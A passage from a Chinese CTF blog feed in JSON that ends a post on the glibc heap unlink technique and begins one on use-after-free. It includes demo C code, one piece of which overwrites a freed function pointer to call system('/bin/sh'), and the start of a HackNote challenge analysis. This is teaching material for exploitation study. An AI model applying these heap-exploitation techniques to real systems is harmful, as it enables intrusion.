data-src=\"https://z1.ax1x.com/2023/10/03/pPOMSN8.png\" alt=\"\" /></p>\n<p>前面构造的为了进行绕过：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>P<span class=\"token operator\">=</span><span class=\"token operator\">&amp;</span>P<span class=\"token operator\">-</span><span class=\"token number\">0x10</span>   <span class=\"token comment\">//P->bk</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>P<span class=\"token operator\">=</span><span class=\"token operator\">&amp;</span>P<span class=\"token operator\">-</span><span class=\"token number\">0x18</span>   <span class=\"token comment\">//P->fd</span></pre></td></tr></table></figure><p>这里的执行是有顺序的，所以  <code>BK-&gt;fd = FD</code>  一定是后执行的，所以结果就为： <code>P=&amp;P-0x18</code></p>\n<p>也就是说可以往 P 里写入值去修改 <code>&amp;P-0x18</code>  的内容！(这里是我们往 <code>P</code>  里写值，其会去修改 <code>&amp;P-0x18</code>  地方的值)</p>\n<h2 id=\"p地址的寻找\"><a class=\"anchor\" href=\"#p地址的寻找\">#</a> P 地址的寻找：</h2>\n<p>然而这里还有一个问题是我们如何去找到 P 的地址，这里我们就需要找到堆的管理数组 (一般在 bbs 段处，会有个数组来记录每个 chunk 的地址)，我们可以在这里找到我们伪造的堆块的 <code>数组</code> 的地址，通过这个地址来减 0x18 放入伪造的堆块的 fd 中即可</p>\n<p>这样我们后续改变就可以根据这个数组来修改地址内部的值</p>\n<p>【个人理解】</p>\n<p>我对于 unlink 漏洞的理解是认为他其实是对 对应的堆块的管理数组进行了修改，将我们想要修改的地址作为堆块给添加了上去，其中的一个数组会存放这个想要修改值的地址，这就会导致我们后面可以对其当作堆块一样进行修改</p>\n<p>参考：</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYmlsaWJpbGkuY29tL3ZpZGVvL0JWMVV2NDExajdmci8/cD0yMA==\">https://www.bilibili.com/video/BV1Uv411j7fr/?p=20</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jbG91ZC50ZW5jZW50LmNvbS9kZXZlbG9wZXIvYXJ0aWNsZS8xNTU3ODcy\">https://cloud.tencent.com/developer/article/1557872</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ob2xsay5ibG9nLmNzZG4ubmV0L2FydGljbGUvZGV0YWlscy8xMDg0ODE4ODk/c3BtPTEwMDEuMjAxNC4zMDAxLjU1MDI=\">https://hollk.blog.csdn.net/article/details/108481889?spm=1001.2014.3001.5502</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9oZWFwL3B0bWFsbG9jMi91bmxpbmsv\">https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/unlink/</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc2VjcHVsc2UuY29tL2FyY2hpdmVzLzExNTM4OC5odG1s\">https://www.secpulse.com/archives/115388.html</span></p>\n<p>堆的数据结构：</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTDBnNG4tYmxvZy9wLzEyOTY1MTg3Lmh0bWw=\">https://www.cnblogs.com/L0g4n-blog/p/12965187.html</span></p>\n",
            "tags": [
                "Linux",
                "pwn",
                "二进制"
            ]
        },
        {
            "id": "https://vvwwvv.cn/2023/10/01/pwn/%E4%B8%93%E6%A0%8F/%E5%A0%86%E5%88%A9%E7%94%A8%E4%B9%8BUAF/",
            "url": "https://vvwwvv.cn/2023/10/01/pwn/%E4%B8%93%E6%A0%8F/%E5%A0%86%E5%88%A9%E7%94%A8%E4%B9%8BUAF/",
            "title": "堆利用之UAF（use after free）",
            "date_published": "2023-10-01T06:15:56.000Z",
            "content_html": "<h1 id=\"1漏洞原因\"><a class=\"anchor\" href=\"#1漏洞原因\">#</a> 1. 漏洞原因</h1>\n<h2 id=\"ctfwiki上的示例\"><a class=\"anchor\" href=\"#ctfwiki上的示例\">#</a> ctfWiki 上的示例：</h2>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdlib.h></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">typedef</span> <span class=\"token keyword\">struct</span> <span class=\"token class-name\">name</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>myname<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token keyword\">void</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>func<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>str<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#125;</span> NAME<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">myprint</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>str<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%s\\n\"</span><span class=\"token punctuation\">,</span> str<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">printmyname</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"call print my name\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  NAME <span class=\"token operator\">*</span>a<span class=\"token punctuation\">;</span> <span class=\"token comment\">//</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  a <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>NAME <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">struct</span> <span class=\"token class-name\">name</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  a<span class=\"token operator\">-></span>func <span class=\"token operator\">=</span> myprint<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  a<span class=\"token operator\">-></span>myname <span class=\"token operator\">=</span> <span class=\"token string\">\"I can also use it\"</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">// 这里的是字符串指针没有被打印</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  a<span class=\"token operator\">-></span><span class=\"token function\">func</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"this is my function\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  <span class=\"token comment\">// free without modify</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>  <span class=\"token function\">free</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>  a<span class=\"token operator\">-></span><span class=\"token function\">func</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"I can also use it\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 释放之后仍然能够调用函数就是因为指针没被置空，这里的 func=myprint, 后面的为参数</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>  <span class=\"token comment\">// free with modify</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>  a<span class=\"token operator\">-></span>func <span class=\"token operator\">=</span> printmyname<span class=\"token punctuation\">;</span><span class=\"token comment\">// 仅仅是对函数的调用了，而是直接将 func 成员变量中的函数指针更改成了 printmyname () 函数，并且调用 func 成员变量。</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>  <span class=\"token comment\">// 虽然 printmyname () 函数不需要参数，但为了能够让程序认为这里依然是 myprint () 函数，并且认为我们的操作是合法的，所以传入了参数 \"this is my function\"。</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>  a<span class=\"token operator\">-></span><span class=\"token function\">func</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"this is my function\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 这里的就没有被打印，因为函数已经更改没有参数输出；</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>  <span class=\"token comment\">// set NULL</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>  a <span class=\"token operator\">=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">;</span>    <span class=\"token comment\">// 这里就将函数指针置空了</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>  <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"this pogram will crash...\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>  a<span class=\"token operator\">-></span><span class=\"token function\">func</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"can not be printed...\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">// 指针置空后就无法再调用了，就会保报错</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>运行结果：</p>\n<pre><code>➜  use_after_free git:(use_after_free) ✗ ./use_after_free                      \nthis is my function\n\nI can also use it         #释放后调用\ncall print my name   #释放后调用\nthis pogram will crash...   \n[1]    38738 segmentation fault (core dumped)  ./use_after_free    #这里的报错是指针置空后再调用引起的\n</code></pre>\n<p>这里我们就发现了，因为没有被置空所以我们能接着用指针内的函数指针来执行对应操作，但是置空后就会报错</p>\n<h2 id=\"一般利用\"><a class=\"anchor\" href=\"#一般利用\">#</a> 一般利用：</h2>\n<p>在申请了一个堆块后，当我们执行了 free 来释放它，但是如果我们没有将这个指针 <code>置空</code> 时，由于 <code>fastbin</code>  我们下一次申请通样大小的堆块，则会申请到上次同一个堆，这时 <code>上一次的堆指针</code> 因为没有被置空则仍然可以访问第二次申请的堆，这样两个指针就指向的是同一个堆块，我们就能够利用</p>\n<pre><code>应用程序调用free()释放内存时，如果内存块小于256kb，\ndlmalloc并不马上将内存块释放回内存，而是将内存块标记为空闲状态。\n这么做的原因有两个：\n一是内存块不一定能马上释放会内核（比如内存块不是位于堆顶端）\n二是供应用程序下次申请内存使用（这是主要原因）。\n当dlmalloc中空闲内存量达到一定值时dlmalloc才将空闲内存释放会内核。\n如果应用程序申请的内存大于256kb，dlmalloc调用mmap()向内核申请一块内存，返回返还给应用程序使用。\n如果应用程序释放的内存大于256kb，dlmalloc马上调用munmap()释放内存。\ndlmalloc不会缓存大于256kb的内存块，因为这样的内存块太大了，最好不要长期占用这么大的内存资源。\n</code></pre>\n<p>这里利用别人的示例代码进行说明：</p>\n<p>原文章地址：<br />\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMxNDgxMTg3L2FydGljbGUvZGV0YWlscy83MzYxMjQ1MQ==\">https://blog.csdn.net/qq_31481187/article/details/73612451</span></p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdlib.h></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">typedef</span> <span class=\"token keyword\">void</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>func_ptr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">evil_fuc</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> command<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token function\">system</span><span class=\"token punctuation\">(</span>command<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">echo</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> content<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%s\"</span><span class=\"token punctuation\">,</span>content<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    func_ptr <span class=\"token operator\">*</span>p1<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span>func_ptr<span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token operator\">*</span><span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"malloc addr: %p\\n\"</span><span class=\"token punctuation\">,</span>p1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    p1<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>echo<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    p1<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"hello world\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token function\">free</span><span class=\"token punctuation\">(</span>p1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 在这里 free 了 p1, 但并未将 p1 置空，导致后续可以再使用 p1 指针</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    p1<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"hello again\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//p1 指针未被置空，虽然 free 了，但仍可使用.</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    func_ptr <span class=\"token operator\">*</span>p2<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span>func_ptr<span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token operator\">*</span><span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//malloc 在 free 一块内存后，再次申请同样大小的指针会把刚刚释放的内存分配出来.</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"malloc addr: %p\\n\"</span><span class=\"token punctuation\">,</span>p2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"malloc addr: %p\\n\"</span><span class=\"token punctuation\">,</span>p1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//p2 与 p1 指针指向的内存为同一地址</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    p2<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>evil_fuc<span class=\"token punctuation\">;</span> <span class=\"token comment\">// 在这里将 p1 指针里面保存的 echo 函数指针覆盖成为了 evil_func 指针.</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    p1<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/bin/sh\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p><img data-src=\"https://img-blog.csdn.net/20170623001441464?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast\" alt=\"\" /></p>\n<p>这里我们可以看见指针没有被置空导致仍然能够向 <code>p1</code>  中改写参数，并且可以调用对应的函数；如果置空时我们就要重新申请堆，这时就无法改写前面堆内部的值</p>\n<h1 id=\"例题hitcontraining_uafuse-after-free\"><a class=\"anchor\" href=\"#例题hitcontraining_uafuse-after-free\">#</a> 例题：hitcontraining_uaf（use after free）</h1>\n<h2 id=\"1程序分析\"><a class=\"anchor\" href=\"#1程序分析\">#</a> 1. 程序分析</h2>\n<p>32 位程序，开了 NX</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/10/01/pPqvvhF.png\" alt=\"\" /></p>\n<p>伪源码：</p>\n<p><code>main</code></p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> __cdecl __noreturn <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> argc<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>argv<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>envp<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">int</span> v3<span class=\"token punctuation\">;</span> <span class=\"token comment\">// eax</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token keyword\">char</span> buf<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+0h] [ebp-Ch] BYREF</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token keyword\">int</span> <span class=\"token operator\">*</span>v5<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+4h] [ebp-8h]</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  v5 <span class=\"token operator\">=</span> <span class=\"token operator\">&amp;</span>argc<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token function\">setvbuf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stdout</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token function\">setvbuf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stdin</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>      <span class=\"token function\">menu</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>      <span class=\"token function\">read</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> buf<span class=\"token punctuation\">,</span> <span class=\"token number\">4u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>      v3 <span class=\"token operator\">=</span> <span class=\"token function\">atoi</span><span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v3 <span class=\"token operator\">!=</span> <span class=\"token number\">2</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>      <span class=\"token function\">del_note</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v3 <span class=\"token operator\">></span> <span class=\"token number\">2</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v3 <span class=\"token operator\">==</span> <span class=\"token number\">3</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>      <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        <span class=\"token function\">print_note</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>      <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>      <span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>      <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v3 <span class=\"token operator\">==</span> <span class=\"token number\">4</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>          <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>LABEL_13<span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Invalid choice\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>      <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    <span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v3 <span class=\"token operator\">!=</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>        <span class=\"token keyword\">goto</span> LABEL_13<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>      <span class=\"token function\">add_note</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p><code>menu：</code></p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">menu</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"----------------------\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"       HackNote       \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"----------------------\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\" 1. Add note          \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\" 2. Delete note       \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\" 3. Print note        \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\" 4. Exit              \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"----------------------\"</span><span class=\"token 